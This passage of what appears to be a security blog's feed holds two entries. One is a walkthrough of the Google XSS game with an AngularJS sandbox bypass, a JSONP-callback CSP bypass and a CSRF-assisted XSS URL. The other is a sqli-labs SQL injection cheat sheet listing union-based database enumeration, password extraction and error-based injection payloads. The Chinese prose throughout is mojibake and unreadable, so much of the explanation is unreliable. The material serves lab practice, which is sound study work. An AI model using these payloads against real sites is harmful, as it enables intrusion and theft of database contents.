ç›´æŽ¥åœ¨ç½‘ä¸Šæœç´¢ Angular1.2.0 xsså¯å¾—åœ¨æ–‡æœ«æˆ‘ä»¬æ‰¾åˆ°äº†å½“å‰ç‰ˆæœ¬å¯¹åº” Angular 1.2.0-1.2.1 çš„ Sandbox bypasses {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}} ç›´æŽ¥è¾“å…¥ä»¥ä¸Špayloadå¾—åˆ° &lt;form action=&quot;/f/rWKWwJGnAeyi/?query=a=&apos;constructor&apos;;b=};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert()&apos;)()}}&quot; method=&quot;POST&quot;&gt; &lt;input id=&quot;demo2-query&quot; name=&quot;query&quot; maxlength=&quot;140&quot; ng-model=&quot;query&quot; placeholder=&quot;Enter query here...&quot;&gt; &lt;input id=&quot;demo2-button&quot; type=&quot;submit&quot; value=&quot;Search&quot;&gt; &lt;/form&gt; å¯ä»¥çœ‹åˆ°æ˜¯è¿›è¡Œäº†è¿‡æ»¤ å·¦èŠ±æ‹¬å·è¢«è¿‡æ»¤äº† { ï½› &amp;#123; --- å¤§æ‹¬å·å·¦è¾¹éƒ¨åˆ†Left curly brace &amp;lcub; ï½ &amp;#125; --- å¤§æ‹¬å·å³è¾¹éƒ¨åˆ†Right curly brace &amp;rcub; &amp;lcub;&amp;lcub;a=&apos;constructor&apos;;b=&amp;lcub;&amp;rcub;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)()&amp;rcub;&amp;rcub; è¿™é‡Œæž„é€ ç®€å•çš„ä¹Ÿå¯ä»¥ï¼Œä¸ç”¨æ‹¼æŽ¥&amp;lcub;&amp;lcub;alert()}} Leval 7 CSPå†…å®¹å®‰å…¨ç­–ç•¥æ˜¯é˜²æ­¢æ³¨å…¥æˆä¸ºå¯åˆ©ç”¨çš„XSSçš„é‡è¦å·¥å…·ã€‚ä½†è¿™ä¸æ˜¯ä¸€ä¸ªçµä¸¹å¦™è¯ - å¾ˆå¤šæ—¶å€™CSPæ”¿ç­–éƒ½æ˜¯å¯ä»¥ç»•è¿‡çš„ã€‚ è¿™ä¸€æŒ‘æˆ˜å±•ç¤ºäº†ä¸€ç§å¸¸è§çš„CSPæ—è·¯æŠ€æœ¯ã€‚ ç›®æ ‡æ˜¯å†æ¬¡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚ &lt;a href=&quot;?menu=YWJvdXQ=&quot;&gt;About Me&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/construction-safety-site-banner-1174806/ License: Public Domain --&gt; &lt;a href=&quot;?menu=Y2F0cw==&quot;&gt;Cats&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/cat-red-christmas-santa-hat-funny-1898512/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/cat-kitten-cute-funny-whiskers-1686730/ License: Public Domain --&gt; &lt;a href=&quot;?menu=ZG9ncw==&quot;&gt;Dogs&lt;/a&gt; &lt;!-- Image source: https://pixabay.com/en/goggles-dog-canine-pet-vacation-1472479/ License: Public Domain --&gt; &lt;!-- Image source: https://pixabay.com/en/dog-sidecar-sunglasses-funny-171773/ License: Public Domain --&gt; &lt;script src=&quot;/static/js/level7.js&quot;&gt;&lt;/script&gt; ä»£ç åˆ†æž?menu=ZG9ncw== menuåŽé¢çš„å‚æ•°ä¼šè¿›è¡Œæ”¹å˜å¯ä»¥çœ‹åˆ°åŠ è½½äº†/static/js/level7.js /static/js/level7.jsä»£ç /** * Ask server side what to display. */ function main() { var m = location.search.match(&apos;menu=(.*)&apos;); var menu = m ? atob(m[1]) : &apos;about&apos;; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); } /** * Display stuff returned from server side. * @param {string} data - JSON data from server side */ function callback(data) { if (data.title) document.write(&apos;&lt;h1&gt;&apos; + data.title + &apos;&lt;/h1&gt;&apos;); if (data.pictures) data.pictures.forEach(function(url) { document.write(&apos;&lt;img src=&quot;/static/img/&apos; + url + &apos;&quot;&gt;&lt;br&gt;&lt;br&gt;&apos;); }); } main(); è§£é‡Šå¦‚ä¸‹function main(){ //æ‰¾åˆ° URL ä¸­ â€œmenu=ï¼Ÿâ€ çš„å‚æ•°ï¼Œå¹¶æŠŠï¼Ÿå‚æ•°åŠ¨æ€æ‹¼æŽ¥æˆä¸€ä¸ª &lt;script&gt; æ ‡ç­¾ï¼Œæ¥è®¿é—®èµ„æºã€‚ //atob å¯¹åº”çš„æ˜¯ Base64 ç¼–ç æ–¹å¼çš„è§£ç æ“ä½œï¼Œæ˜¯çš„ï¼Œbtoaå°±æ˜¯ç¼–ç  } function callback(data){ // é€šè¿‡ä»£ç åˆ¤æ–­ï¼Œdata åº”è¯¥æ˜¯ json æ ¼å¼ã€‚ // å–å‡ºå…¶ä¸­çš„ title å’Œ pictures å¯¹åº”çš„ valueï¼Œæ‹¼æŽ¥æˆ HTML ä»£ç ï¼Œæ’å…¥åˆ°é¡µé¢ä¸­ï¼Œæ¥è®¿é—®èµ„æº } main(); //æ‰§è¡Œ main æ–¹æ³• æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå…¶ä¸­å¼€å¤´çš„ callback ä¸Žæˆ‘ä»¬ level7.js ä¸­çš„ callback æ–¹æ³•çš„åç§°ä¸€æ ·ï¼Œè€Œä¸”å†…å®¹ä¸­ä¹Ÿå«æœ‰ç›¸åº”çš„ title ä¸Ž picturesï¼Œæˆ‘ä»¬åŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸ª json ä¸²è¿”å›žåŽä¼šè‡ªåŠ¨æ‰§è¡Œ callback å‡½æ•°ï¼Œåƒæ˜¯æŸç§çº¦å®šï¼Œæˆ‘ä»¬åŽ»æŸ¥æŸ¥çœ‹è¿™ä¸ª â€˜jsonpâ€™ï¼š JSONPï¼šJSONP å…¨ç§°æ˜¯ JSON with Padding ï¼Œæ˜¯åŸºäºŽ JSON æ ¼å¼çš„ä¸ºè§£å†³è·¨åŸŸè¯·æ±‚èµ„æºè€Œäº§ç”Ÿçš„è§£å†³æ–¹æ¡ˆã€‚ä»–å®žçŽ°çš„åŸºæœ¬åŽŸç†æ˜¯åˆ©ç”¨äº† HTML é‡Œ å…ƒç´ æ ‡ç­¾ï¼Œè¿œç¨‹è°ƒç”¨ JSON æ–‡ä»¶æ¥å®žçŽ°æ•°æ®ä¼ é€’ã€‚ æœç´¢å‘çŽ°å…¶ä¸­callbackå¯å®šä¹‰å¯¼è‡´ä¸€äº›å®‰å…¨é—®é¢˜ æˆ‘ä»¬ç”¨ callback è¿™ä¸ªå‚æ•°åŽ»æˆ‘ä»¬çš„ Level 7 ä¸­æµ‹è¯•ä¸€ä¸‹?callback=3 callbackæ‰§è¡ŒæˆåŠŸï¼Œè¯´æ˜Žå­˜åœ¨é—®é¢˜Level7.jsä¸­ function main() { var m = location.search.match(&apos;menu=(.*)&apos;);// æŸ¥æ‰¾äº†ä¸€ä¸‹å½“å‰ URL ä¸­ &apos;menu=&apos; åŽé¢çš„å‚æ•° var menu = m ? atob(m[1]) : &apos;about&apos;; // å¦‚æžœæ²¡æœ‰èŽ·å–åˆ°å‚æ•°ï¼Œåˆ™èµ‹å€¼ä¸º &apos;about&apos; document.write(&apos;&lt;script src=&quot;jsonp?menu=&apos; + encodeURIComponent(menu) + &apos;&quot;&gt;&lt;/script&gt;&apos;); // åœ¨é¡µé¢ä¸­å†™å…¥ &lt;script&gt; æ ‡ç­¾ ï¼Œé€šè¿‡ src è¯·æ±‚èµ„æº } å› ä¸º encodeURIComponent çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æˆªæ–­ script æ ‡ç­¾å¹¶åŠ å…¥ img ç”¨ onerror æ‰§è¡Œ alert çš„æ–¹å¼è¡Œä¸é€šï¼Œå†™å…¥çš„å†…å®¹åœ¨è½¬ä¹‰åŽä¼šè¢«æµè§ˆå™¨è§£æžä¸ºä¸€ä¸ªä¸ä¼šè¢«è§£æžæˆ html æ ‡ç­¾çš„å­—ç¬¦ä¸²ã€‚ æ­£å¸¸æƒ…å†µä¸‹ï¼Œmenu çš„å€¼ä¼šæœ‰4ç§å¯èƒ½ï¼Œç©ºå€¼å’Œ index é¡µé¢ä¸­ä¸‰ä¸ª a æ ‡ç­¾å†…é™æ€çš„å€¼ï¼Œdocument.write æ—¶å†™ä¸‹çš„ script æ ‡ç­¾å†…çš„ menu å‚æ•°æœ‰ä¸‰ç§å¯èƒ½ï¼šâ€™aboutâ€™ã€â€™catsâ€™ã€â€™dogsâ€™ã€‚ç›¸åº”çš„ä¼šæœ‰ä¸‰ç§ callback çš„ JSON å¯¹è±¡ã€‚å¦‚æžœæˆ‘ä¼ å…¥ä¸€ä¸ªå…¶ä»–å‚æ•°ï¼ŒåŽå°åšæ²¡åš default å¤„ç†å‘¢ï¼Œä¼šè¿”å›žä»€ä¹ˆå†…å®¹å‘¢ã€‚æˆ‘ä»¬è¿™é‡Œè¯•ä¸€ä¸‹ï¼Œå› ä¸ºä»–æŽ¥å—å‚æ•°åŽè¦è¿›è¡Œ base64 è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å‚æ—¶è¦å…ˆè¿›è¡Œ base64 ç¼–ç ï¼Œâ€™atobâ€™ å‡½æ•°æ˜¯è§£ç ï¼Œç¼–ç å‡½æ•°çŒœä¹ŸçŒœåˆ°åº”è¯¥æ˜¯ â€˜btoaâ€™ äº†~ éªŒè¯ä¸€ä¸‹æžœç„¶å¦‚æ­¤ è€Œä¸”æˆ‘ä»¬å‘çŽ°æŠ¥é”™åŽç›´æŽ¥è¾“çš„å€¼ä¸ºæˆ‘ä»¬è¾“å…¥çš„å€¼è½¬ç åŽçš„å€¼ æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æžœæˆ‘ä»¬è¾“å…¥çš„ menu å‚æ•°ä¸æ˜¯ä»–æœŸæœ›çš„å‚æ•°ï¼Œä»–ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚æˆ‘ä»¬æž„å»ºä¸€ä¸ª img æ ‡ç­¾ä¼ è¿›åŽ»è¯•ä¸€ä¸‹ï¼š æ‰§è¡Œå¤±è´¥ï¼Œçº¢è‰²çš„æŠ¥é”™éƒ¨åˆ†æ˜¾ç¤ºç”±äºŽCSPçš„åŽŸå› ï¼Œæ‰§è¡Œå¤±è´¥ PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= çŽ°åœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ä¸¤ä¸ªç‚¹æ˜¯1ã€callbackå¯ä»¥ä½¿ç”¨ã€2ã€menuä¼ é€’é”™è¯¯çš„å‚æ•°å¯ä»¥æ˜¾ç¤ºã€ ç»™ menu ä¼ å…¥ç»è¿‡ base64 ç¼–ç åŽçš„ï¼š &lt;script src=&apos;jsonp?callback=alert()%3B//&apos;&gt;&lt;/script&gt; // è½¬ä¹‰å‰ä¸ºï¼š&lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; ä¼šæŠŠ &lt;script src=&apos;jsonp?callback=alert();//&apos;&gt;&lt;/script&gt; æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œscript æ ‡ç­¾ä¼šå°è¯•åŠ è½½ï¼Œè§¦å‘ä¸€ä¸ªè¯·æ±‚ï¼Œscript è€Œè¯·æ±‚çš„è¿”å›žå†…å®¹ä¸ºï¼š alert();//({â€¦})alert(); åŽé¢è¢«æ³¨é‡ŠæŽ‰ï¼Œæ‰§è¡Œ alert(); PayloadPHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCklM0IvLyc+PC9zY3JpcHQ+ æ‰§è¡ŒæˆåŠŸ Level 8 CSRFæ­¤æŒ‘æˆ˜æ¼”ç¤ºäº†è®¸å¤šWebå®‰å…¨æ€§æ¦‚å¿µï¼Œä¾‹å¦‚CSPï¼Œè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ä»¤ç‰Œå’ŒSelf-XSSã€‚ ç›®æ ‡æ˜¯å†æ¬¡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´žä½¿å…¶æ‰§è¡ŒJavaScript alertï¼ˆï¼‰å‡½æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé‡è¦çš„æ˜¯ï¼Œè§£å†³æ–¹æ¡ˆURLä¹Ÿåº”è¯¥åœ¨å…¶ä»–æµè§ˆå™¨ä¸­è§¦å‘ç›¸åŒçš„ç»“æžœ - ä»…ä½¿ç”¨è¿™äº›ç‰¹å®šçš„cookieæ˜¾ç¤ºåœ¨æ­¤è®¡ç®—æœºä¸Šå·¥ä½œçš„URLæ˜¯ä¸å¤Ÿçš„ã€‚ å…³é”®ä»£ç åˆ†æž/** * Read cookie. * @param {string} name - Name of the cookie * @returns {string} Cookie value */ function readCookie(name) { var match = RegExp(&apos;(?:^|;)\\s*&apos; + name + &apos;=([^;]*)&apos;).exec(document.cookie); return match &amp;&amp; match[1]; } var username = readCookie(&apos;name&apos;); if (username) { document.write(&apos;&lt;h1&gt;Welcome &apos; + username + &apos;!&lt;/h1&gt;&apos;); } document.addEventListener(&quot;DOMContentLoaded&quot;, function(event) { csrf_token.value = readCookie(&apos;csrf_token&apos;); }); è¿™ä¸ªæ–‡ä»¶è´Ÿè´£è¯»å– cookie çš„ä¿¡æ¯ï¼Œå¦‚æžœè¯»å–åˆ°äº† â€˜nameâ€™ çš„å†…å®¹ï¼Œå°± document.write åˆ°é¡µé¢ä¸Šã€‚ æµ‹è¯•ä¸€ä¸‹ setå°¤å…¶æ˜¯è¿™ä¸ªurlå¾ˆå¥‡æ€ªvalueçš„å€¼ä¸ºè¾“å…¥çš„åå­—åŽé¢é‡å®šå‘åˆ°äº†index http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=testhahha&amp;redirect=index è¾“å…¥ä¸€ä¸ªéžæ•´æ•° å¯ä»¥çœ‹åˆ°é¡µé¢æ˜¾ç¤ºäº†æˆ‘ä»¬è¾“å…¥çš„å°æ•°ã€ http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=hello&amp;amount=0.22&amp;csrf_token=EVPQBFQCH2 urlä¸­çš„csrf_tokenä½œä¸ºå‚æ•°ä¼ é€’ç»™åŽå° å¾—åˆ°çš„ä¿¡æ¯1ã€è¾“å…¥çš„ä¸åˆæ³•å‚æ•°é‡‘é¢ accountçš„å€¼ä¼šæ˜¾ç¤ºå‡ºæ¥ 2ã€æ­¤é¡µé¢æ²¡æœ‰CSPçš„æ ‡è¯† 3ã€csrf_token ä½œä¸ºå‚æ•°ä¼ é€’ç»™åŽå°ã€‚ åœ¨accountå¤„æž„é€ èƒ½å¤Ÿå¼¹çª—çš„ä»£ç  &lt;script&gt;alert()&lt;/script&gt; å¤±è´¥ è­¦å‘Šæ˜¾ç¤ºæ‚¨æ‰§è¡Œäº†è­¦æŠ¥ï¼Œä½†è§£å†³æ–¹æ¡ˆçš„æœåŠ¡å™¨ç«¯éªŒè¯å¤±è´¥ã€‚è¿™å¯èƒ½æ„å‘³ç€æ‚¨çš„è§£å†³æ–¹æ¡ˆéœ€è¦ç”¨æˆ·äº¤äº’ï¼Œæˆ–è€…ä¸å¤Ÿé€šç”¨ï¼Œæ— æ³•ä¸ºä¸åŒçš„ç”¨æˆ·å·¥ä½œã€‚è¯·å°è¯•ä½¿å…¶æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œå¹¶ä¸”è¶³å¤Ÿé€šç”¨ï¼Œä»¥ä¾¿é€‚ç”¨äºŽä»»ä½•ç”¨æˆ·ã€‚å®ƒä¹Ÿå¯èƒ½æ˜¯ç”±ä½¿ç”¨ç»å¯¹URLå¼•ç”¨å¼•èµ·çš„ - è¯·é¿å…ä½¿ç”¨å®ƒä»¬ è¿™é‡Œçš„æ„æ€ç”±äºŽä¸åŒçš„ç”¨æˆ·çš„åŽŸå› ï¼Œå› ä¸º csrf_token æ¯ä¸ªäººçš„éƒ½ä¸åŒ token å¾ˆå¯èƒ½å¯ä»¥è¢« setï¼Œå¦‚æžœå¯è¡Œï¼Œé‚£å°±é€šâ€¦â€¦ ä½ æ‡‚å¾—ã€‚æˆ‘ä»¬æ¥é€šè¿‡ set è®¾ç½® tokenï¼Œé€šè¿‡ redirect è·³è½¬åˆ°æˆ‘ä»¬ä¹‹å‰æˆåŠŸ alert() çš„æ±‡æ¬¾é“¾æŽ¥ï¼Œå¹¶æŠŠå…¶ä¸­çš„ token è®¾ç½®æˆæˆ‘ä»¬å‰é¢ set çš„å€¼ã€‚OKï¼Œæˆ‘ä»¬æ¥æž„å»ºURLï¼š http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer?name=hello+kitty&amp;amount=&lt;script&gt;alert()&lt;/script&gt;&amp;csrf_token=Pass è¿™é‡Œè¦æ³¨æ„ï¼Œæˆ‘ä»¬å¦‚æžœç›´æŽ¥è¿™æ ·è®¿é—®ï¼Œredirect çš„å€¼ä¼šæ˜¯ï¼štransfer?name=hello kittyã€‚ä¹Ÿå°±æ˜¯åˆ°ä¸‹ä¸€ä¸ª &amp; ç¬¦ä¼šè¢«æˆªæ–­ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œ æŠŠè¿™ä¸ª â€˜redirect=â€™ åŽé¢çš„å†…å®¹å¤„ç†ä¸€ä¸‹ï¼Œchrome æŽ§åˆ¶å°ï¼š encodeURIComponent(&apos;transfer?name=hello+kitty&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=Pass&apos;) å¾—åˆ°è¿”å›žå€¼ï¼š transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass å¥½æˆ‘ä»¬æ›¿æ¢ä¸€ä¸‹ URLï¼š http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=Pass&amp;redirect=transfer%3Fname%3Dhello%2Bkitty%26amount%3D%253Cscript%253Ealert()%253C%2Fscript%253E%26csrf_token%3DPass å‚ç…§http://or7.me/2017/08/03/Google_xssgame/http://www.freebuf.com/articles/web/133384.html]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
        <tag>XSS-game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Summarize-Less-1-22_Basic-Injections]]></title>
    <url>%2F2018%2F07%2F04%2Fsqli-labs-Summarize-Less-1-22-Basic-Injections%2F</url>
    <content type="text"><![CDATA[sqli-labs-Summarize-Less-1-22(Basic-Injections)é‡è¦çš„ç³»ç»Ÿæ•°æ®åº“mysql.user å­˜å‚¨MySQLæ•°æ®åº“çš„ç”¨æˆ·åŠç”¨æˆ·æƒé™ä¿¡æ¯ and (select count(*) from mysql.user)&gt; åˆ¤æ–­æ˜¯å¦å…·æœ‰è¯»å†™æƒé™ information_schema.user_privilegeså­˜å‚¨mysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„æƒé™ä¿¡æ¯ information_schema.schemate å­˜å‚¨mysqlä¸­æ‰€æœ‰çš„æ•°æ®åº“ éåŽ†æŸ¥è¯¢ç³»ç»Ÿä¸­æ‰€æœ‰æ•°æ®åº“å select schema_name from information_schema.schemata limit 0,1 information_schema.tables å­˜å‚¨mysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„è¡¨ éåŽ†æŸ¥è¯¢æ•°æ®åº“ä¸­æ‰€æœ‰çš„è¡¨å select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1 information_schema.columnså­˜å‚¨mysqlä¸­æ‰€æœ‰æ•°æ®åº“çš„åˆ— éåŽ†æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰çš„åˆ—å select column_name form information_schema.columns where table_name=&apos;users&apos; limit 0,1 éåŽ†æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ® select password from security.users limit 0,1 å¸¸ç”¨æ“ä½œå¸¸ç”¨è¯­å¥select ç”¨äºŽè¾“å‡ºä¿¡æ¯ select åˆ—å|ï¼ˆæ•°å­—|å­—ç¬¦ä¸²|å‡½æ•°ï¼‰as åˆ«åï¼ˆaså¯ä»¥çœç•¥ï¼‰[from ...] union è”åˆæ“ä½œç¬¦ï¼Œè¦æ±‚å‰åŽåˆ—æ•°ç›¸åŒï¼Œæ•°æ®ç±»åž‹ç›¸å·®ä¸å¤§ group by åˆ†ç»„ order by æŽ’åºï¼Œå¸¸ç”¨äºŽçŒœè§£å­—æ®µæ•° order by åˆ—å|åºåˆ—å· sqlçš„switchè¯­å¥ case expr when a then a** when b then b* else c* end if å‡½æ•°ï¼Œå½“expr1ä¸ºçœŸè¿”å›žexpr2å¦åˆ™è¿”å›žexpr3 if(expr1,expr2,expr3) å¸¸ç”¨å‡½æ•°ï¼ˆèŽ·å–ç³»ç»Ÿä¿¡æ¯ï¼‰system_user() /*ç³»ç»Ÿç”¨æˆ·å user() /*ç”¨æˆ·å current_user() /*å½“å‰ç”¨æˆ·å session_user() /*è¿žæŽ¥æ•°æ®åº“çš„ç”¨æˆ·å database() /*æ•°æ®åº“å version() /*MYSQLæ•°æ®åº“ç‰ˆæœ¬ load_file() /*MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•° @@datadir /*è¯»å–æ•°æ®åº“è·¯å¾„ @@basedir MYSQL /*å®‰è£…è·¯å¾„ @@version_compile_os /*æ“ä½œç³»ç»Ÿ å¸¸ç”¨å­—ç¬¦ä¸²å‡½æ•°concat() /*è¿žæŽ¥å­—ç¬¦ä¸² group_concat() concat_ws() /*è¿žæŽ¥å­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºåˆ†éš”ç¬¦ char() /*èŽ·å¾—å­—ç¬¦ä¸² left(str, len) /*æˆªå–strå·¦è¾¹lenä½ right(str, len) /*æˆªå–strå³è¾¹lenä½ substring(str, pos, len) /*æˆªå–å­—ç¬¦ä¸² rand() /*ç”Ÿæˆ0è‡³1çš„éšæœºæ•° floor(n) /*å‘ä¸‹å–æ•´ name_conset(column_name, value) /*ç”¨æ¥äº§ç”Ÿä¸€ä¸ªç»“æžœé›†åˆ sleep(seconds) åœæ­¢secondsç§’ï¼Œç”¨äºŽtime-basedç›²æ³¨ benchmark(times, function) å°†functionæ‰§è¡Œtimesæ¬¡ï¼Œè¯¥å‡½æ•°å¯ç”¨äºŽtime-basedç›²æ³¨ï¼Œä¾‹å¦‚ï¼ˆbenchmark(500000, encode(â€˜aâ€™,â€™b&apos;))ï¼‰ encode(str, passwd_str) ä½¿ç”¨passwd_stråŠ å¯†strå‡½æ•° åˆ¤æ–­æ˜¯å¦å¯ä»¥æ³¨å…¥ä½¿ç”¨æ ‡ç‚¹ç¬¦å·(å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œæ‹¬å·)åˆ¤æ–­æ³¨å…¥ï¼Œä¾‹å¦‚ï¼šhttp://aaa.com/s.php?id=1&apos; å¦‚æžœè¿”å›žé¡µé¢æç¤ºsyntax errorï¼Œåˆ™è¯´æ˜Žæœ‰æ¼æ´ž é€šè¿‡é™„åŠ é€»è¾‘è¿ç®—åˆ¤æ–­æ³¨å…¥ï¼Œä¾‹å¦‚ï¼šhttp://aaa.com/s.php?id=1 and 1=1/and 1=2 and 1=1æœ‰è¿”å›žï¼Œand 1=2æ— è¿”å›ž é€šè¿‡ç®—æ•°è¿ç®—åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¾‹å¦‚ï¼šhttp://aaa.com/s.php?id=11-1 é€šè¿‡selectè¯­å¥åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¾‹å¦‚ï¼šhttp://aaa.com/s.php?id=(select 10) é€šè¿‡æ—¶é—´å‡½æ•°åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œä¾‹å¦‚ï¼šhttp://aaa.com/s.php?id=2 and sleep(10) æˆ–è€…http://aaa.com/s.php?id=2 and benchmark(500000, encode(&apos;msg&apos;,&apos;bbb&apos;)) å¸¸è§„æ³¨å…¥æµç¨‹çŒœè§£åˆ—æ•°order by n /*ï¼ˆæ³¨é‡Šç¬¦ /* # --ï¼‰ æŸ¥è¯¢mysqlåŸºæœ¬ä¿¡æ¯(å‡è®¾æ•°æ®åº“è¡¨æœ‰7åˆ—)and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/* ä¾‹å¦‚ï¼šselect * from sedb.site_tb where 1=2 union select 1,2,concat_ws(char(32,58,32),0x7c,user(),database(),version()); æŸ¥è¯¢mysqlæ•°æ®åº“ä¸­æœ‰å“ªäº›æ•°æ®åº“(æ³¨æ„ä½¿ç”¨limité™åˆ¶æŸ¥è¯¢çš„èŒƒå›´)and 1=2 union select 1,schema_name,3,4 from information_schema.schemata/* and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/* ä¾‹å¦‚ï¼šselect * from site_tb where 1=2 union select 1, 2, group_concat(schema_name) from information_schema.schemata; æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨ï¼ˆæ•°æ®åº“åå¯èƒ½éœ€è¦16è¿›åˆ¶ï¼‰and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=æ•°æ®åº“å and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=æ•°æ®åº“å ä¾‹å¦‚ï¼šselect * from site_tb where 1=2 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&apos;sedb&apos;; æŸ¥è¯¢æŸä¸ªè¡¨ä¸­æœ‰å“ªäº›å­—æ®µï¼ˆè¡¨åã€æ•°æ®åº“åå¯èƒ½éœ€è¦16è¿›åˆ¶ï¼‰and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=è¡¨å and table_schema=æ•°æ®åº“å limit 1,1/* and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=è¡¨å and table_schema=æ•°æ®åº“å/* ä¾‹å¦‚ï¼šselect * from site_tb where 1=2 union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&apos;site_tb&apos; and table_schema=&apos;sedb&apos;; æŸ¥è¯¢æ•°æ®ï¼šand 1=2 union select 1,2,3,å­—æ®µ1,5,å­—æ®µ2,7,8 from æ•°æ®åº“.è¡¨/* MySqlæŠ¥é”™æ³¨å…¥å‡è®¾æŸ¥è¯¢è¯­å¥ä¸ºï¼š select name,password from test.user where id={å‚æ•°} {å‚æ•°}ï¼šæŒ‰ç…§mysqlè¯­æ³•ï¼ŒwhereåŽå¯ä»¥è·Ÿandã€unionï¼Œå› æ­¤å¯ä»¥1 and (select )ä»¥åŠ1 union select æ¥è§¦å‘æŠ¥é”™æ³¨å…¥ å› æ­¤æ’å…¥æŠ¥é”™è¯­å¥ä½ç½®å¦‚ä¸‹ï¼š select colum1,colum2 from table where id={0} and {1} union {2} ä½¿ç”¨floor/left/rightï¼šselect 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a; select 1 from (select concat(user(),left(rand(),3)),count(*) from information_schema.tables group by 1)a; select 1 from (select concat(user(),right(rand(),3)),count(*) from information_schema.tables group by 1)a; ä¾‹å¦‚ï¼š select name,password from user where id=1 union select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos; ä½¿ç”¨name_constï¼šselect 1 from (select name_const(version(),1),name_const(version(),1))x ä¾‹å¦‚ï¼š select name,password from test.user where id=1 union select 1 from (select name_const(version(),1), name_const(version(), 1))x; ä½¿ç”¨updatexmlï¼šupdatexml(1,concat(0x3a,user()),1) ä¾‹å¦‚ï¼š select name,password from test.user where id=2 and updatexml(1,concat(0x3a,user()),1); ä½¿ç”¨extractvalueï¼šextractvalue(1, concat(0x5c,version())) ä¾‹å¦‚ï¼š select name,password from test.user where id=2 and extractvalue(1, concat(0x5c, version())); ä½¿ç”¨expï¼šexp(~(select*from(select user())x)) ä¾‹å¦‚ï¼š select name,password from test.user where id=exp(~(select*from(select user())x)); ä½¿ç”¨GeometryCollectionï¼šGeometryCollection((select * from (select * from(select user())a)b)) polygon((select * from (select * from(select user())a)b)) multipoint((select * from (select * from(select user())a)b)) multilinestring((select * from (select * from(select user())a)b)) multipolygon((select * from (select * from(select user())a)b)) linestring((select * from (select * from(select user())a)b)) ä¾‹å¦‚ï¼š select name,password from test.user where id=2 and GeometryCollection((select * from (select * from(select user())a)b));]]></content>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-17-22]]></title>
    <url>%2F2018%2F04%2F26%2Fsqli-labs-Less-17-22%2F</url>
